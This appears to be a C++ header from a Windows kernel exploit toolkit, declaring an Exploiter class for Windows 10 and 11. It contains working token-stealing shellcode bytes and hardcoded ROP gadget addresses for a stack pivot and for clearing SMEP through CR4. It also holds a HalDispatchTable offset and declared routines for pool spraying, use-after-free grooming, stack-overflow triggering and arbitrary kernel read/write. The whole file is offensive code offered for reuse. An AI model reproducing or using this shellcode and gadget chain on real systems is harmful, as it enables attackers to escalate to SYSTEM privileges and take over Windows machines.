#pragma once
#include <Windows.h>
#include <iostream>
#include <winternl.h>
#include <Psapi.h>
#include <vector>
#include <functional>
#include <vector>
#include <optional>
#include "Leaker.h"
#include "ROP.h"

#define WIN11
#define DEFRAGMENT_CHUNK_AMOUNT 20000
#define SPRAYING_CHUNK_AMOUNT 60000

namespace aek {
	typedef struct PipeHandles {
		HANDLE read;
		HANDLE write;
	} PipeHandles, *PPipeHandles;

	BYTE shellcode_bytes[0x100] = {
		0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48,
		0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc0, 0x4d,
		0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xe8, 0x48,
		0x04, 0x00, 0x00, 0x4d, 0x8b, 0x88, 0x40, 0x04, 0x00, 0x00,
		0x49, 0x83, 0xf9, 0x04, 0x75, 0xe5, 0x49, 0x8b, 0x88, 0xb8,
		0x04, 0x00, 0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8,
		0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01,
		0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66,
		0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48,
		0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68,
		0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00,
		0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa,
		0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48,
		0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	class Exploiter {
	private:

#ifdef WIN10
		typedef enum SystemString : UINT64 {
			lsass = 0x78652e737361736c,
			proc = 0x636f7250
		} SystemString;

		typedef enum StaticAddress : UINT64 {
			kUser_shared_data = 0xFFFFF78000000800,
			fake_stack_0x48000000 = 0x48000000
		} StaticStructures;

		typedef enum Offset {
			off_MiGetPteAddress = 0x57738 + 0x13,
			off_HalDispatchTable = 0x426790 + 0x8
		} Offset;

		typedef enum Gadgets : UINT64 {
			pop_rcx = 0x140677f39,
			mov_cr4_rcx = 0x1409a4349,
			stack_pivot_0x48000000 = 0x1402d5880,	//// mov esp, 0x48000000; add esp, 0x28; ret; 
		} Gadgets;

		typedef enum Integers {
			pipe_header_size = 0x28
		} Integers;

#else // WIN11
		typedef enum SystemString : UINT64 {
			lsass = 0x78652e737361736c,
			proc = 0x636f7250
	} SystemString;

		typedef enum StaticAddress : UINT64 {
			kUser_shared_data = 0xFFFFF78000000800,
			fake_stack_0x48000000 = 0x48000000
		} StaticStructures;

		typedef enum Offset {
			off_MiGetPteAddress = 0x57738 + 0x13,
			off_HalDispatchTable = 0x426790 + 0x8
		} Offset;

		typedef enum Gadgets : UINT64 {
			pop_rcx = 0x14078ca13,
			mov_cr4_rcx = 0x1403a5fc7,
			stack_pivot_0x48000000 = 0x1402ce4c0,	//// mov esp, 0x48000000; add esp, 0x28; ret; 
		} Gadgets;

		typedef enum Values : UINT64 {
			pipe_header_size = 0x28,
			cr4_value_nosmep = (0x350ef8 ^ 1UL << 20),
		} Integers;

#endif //WIN_VERSION


		typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(IN ULONG ProfileSource, OUT PULONG Interval);
		
		UINT64 krnl_base = 0, pte_base = 0;
		//Leaker lk;
		Leaker& lk;
		
		PVOID shellcode = nullptr;

		BOOL Success(const char description[]);
		BOOL Error(const char description[]);

		// UAF
		std::vector<PipeHandles> groomed_chunks;
		size_t chunk_size = 0;

		// StackOverflow
		size_t dummy_size = 0;

	public:
		Exploiter(Leaker& lk) : lk(lk) {};
		BOOL Exploit();
		BOOL ExploitARAW();
		BOOL ExploitNonpagedPoolUaF();
		BOOL ExploitStackOverflow();

		// UAF
		VOID SetChunkSize(size_t chunk_size);
		BOOL CreateNPipes(size_t amount);
		BOOL CloseNPipes();
		BOOL DefragmentPool();
		BOOL SprayPool();
		BOOL MakePoolHoles();
		BOOL FillPoolHoles();
		BOOL PrepareROP(PVOID stack_address);

		// StackOverflow
		VOID SetDummySize(size_t dummy_size);

		// Common
		BOOL PrepareShellcode();

		// exploit_ARAW
		std::function<BOOL(PVOID, UINT64)> ArbitraryWriteRoutine;	//(PVOID dest_krnl_addr, UINT64 data_usr_8)
		std::function<UINT64(PVOID)> ArbitraryReadRoutine;	//(PVOID src_krnl_addr) => UINT64 krnl_value

		// exploit_NonpagedPool_UAF
		std::function<BOOL()> AllocateTriggerPool;
		std::function<BOOL(UINT64)> AllocateFakePool;	//(UINT64 value(function pointer)
		std::function<BOOL()> FreeTriggerPool;
		std::function<BOOL()> TriggerCallbackFunction;

		// StackOverflow
		std::function<BOOL(PVOID, size_t)> TriggerStackOverflow;	//(PVOID payload, size_t size)
	};
}